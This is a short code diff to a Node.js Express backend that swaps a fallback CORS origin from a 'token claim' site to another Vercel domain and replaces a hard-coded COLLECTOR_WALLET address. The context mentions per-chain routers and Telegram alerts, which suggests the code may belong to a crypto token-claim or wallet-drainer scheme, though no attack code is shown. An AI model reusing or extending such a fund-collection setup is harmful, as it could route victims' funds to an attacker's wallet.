@@ -21,7 +21,7 @@ app.use(helmet({
 
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
-  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app', 'https://bthbk.vercel.app'];
+  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app'];
 
 app.use(cors({
   origin: allowedOrigins,
@@ -166,7 +166,7 @@ const PROJECT_FLOW_ROUTERS = {
   'Optimism': null // Not deployed yet
 };
 
-const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0xde6b7d22e9ed0b07d752196e8914bdc2908e1824';
+const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';
 
 // ============================================
 // CONTRACT ABI
@@ -1000,3 +1000,4 @@ app.listen(PORT, '0.0.0.0', async () => {
   
   await testTelegramConnection();
 });
+
